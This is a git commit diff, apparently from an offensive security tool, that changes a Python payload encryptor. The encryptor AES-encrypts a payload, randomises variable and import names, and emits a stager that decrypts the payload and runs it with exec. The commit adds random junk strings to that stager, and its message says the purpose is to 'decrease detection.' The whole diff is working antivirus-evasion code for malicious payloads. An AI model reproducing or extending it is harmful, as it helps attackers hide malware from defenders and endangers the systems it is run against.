7efe359454091085e4b88c588cf395fb87bc35f5
charliedean <dean.charlie07@gmail.com>
2017-02-21 10:40:30 +0000

    added random junk to payloads to decrease detection

--- lib/encrypt.py
+++ lib/encrypt.py
@@ -6,6 +6,12 @@ import string
 def randomVar():
     return ''.join(random.sample(string.ascii_lowercase, 8))
 
+def randomJunk():
+    newString = ''
+    for i in xrange(random.randint(30, 50)):
+        newString += ''.join(random.sample(string.ascii_lowercase, 3))
+    return newString
+
 def do_Encryption(payload):
     counter = os.urandom(16)
     key = os.urandom(32)
@@ -19,9 +25,11 @@ def do_Encryption(payload):
     encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes))
 
     newpayload = "# -*- coding: utf-8 -*- \n"
+    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
     newpayload += "import Crypto.Cipher.AES as AES \nimport ctypes as %s \n" % randctypes
     newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
     newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
+    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
     newpayload += "decrypto = AES.new(%s , AES.MODE_CTR, counter=lambda: %s )\n" % (randkey,randcounter)
     newpayload += "%s = decrypto.decrypt('%s'.decode('hex')) \n" % (randcipher, encrypted.encode('hex'))
     newpayload += "exec(%s)" % randcipher
